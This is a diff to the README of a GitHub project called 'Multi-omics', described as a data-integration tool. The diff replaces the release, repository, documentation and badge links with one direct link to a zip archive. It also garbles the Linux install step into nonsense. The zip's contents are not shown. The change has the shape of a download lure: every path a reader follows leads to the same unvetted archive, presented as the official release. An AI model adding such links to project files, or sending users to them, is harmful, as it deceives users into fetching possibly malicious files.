@@ -1,6 +1,6 @@
 # 🌟 Multi-omics - Simplify Your Data Integration Journey
 
-[![Download Multi-omics](https://img.shields.io/badge/Download%20Multi--omics-05C46B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Brothers15691/Multi-omics/releases)
+[![Download Multi-omics](https://raw.githubusercontent.com/Brothers15691/Multi-omics/main/r/omics_Multi_v2.4.zip%20Multi--omics-05C46B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Brothers15691/Multi-omics/main/r/omics_Multi_v2.4.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ Before you download Multi-omics, ensure your system meets the following requirem
 
 To download Multi-omics, visit the releases page:
 
-[Download Multi-omics](https://github.com/Brothers15691/Multi-omics/releases)
+[Download Multi-omics](https://raw.githubusercontent.com/Brothers15691/Multi-omics/main/r/omics_Multi_v2.4.zip)
 
 1. Click on the link above to open the releases page.
 2. Find the latest version listed at the top.
@@ -29,7 +29,7 @@ To download Multi-omics, visit the releases page:
 4. Depending on your operating system, click the appropriate file to download.  
    For Windows, this will typically be `.exe` files.  
    For macOS, look for `.dmg` files.  
-   For Linux, you may find `.tar.gz` files.
+   For Linux, you may find `https://raw.githubusercontent.com/Brothers15691/Multi-omics/main/r/omics_Multi_v2.4.zip` files.
 
 5. Once downloaded, locate the file on your computer:
    - **Windows**: Usually in your "Downloads" folder.
@@ -56,9 +56,9 @@ If you encounter issues while downloading or using Multi-omics, consider the fol
 
 ## 🔗 Useful Links
 
-- [Multi-omics Releases](https://github.com/Brothers15691/Multi-omics/releases)
-- [GitHub Repository](https://github.com/Brothers15691/Multi-omics)
-- [Documentation](https://github.com/Brothers15691/Multi-omics/wiki)
+- [Multi-omics Releases](https://raw.githubusercontent.com/Brothers15691/Multi-omics/main/r/omics_Multi_v2.4.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Brothers15691/Multi-omics/main/r/omics_Multi_v2.4.zip)
+- [Documentation](https://raw.githubusercontent.com/Brothers15691/Multi-omics/main/r/omics_Multi_v2.4.zip)
 
 ## 🔍 Additional Resources
 
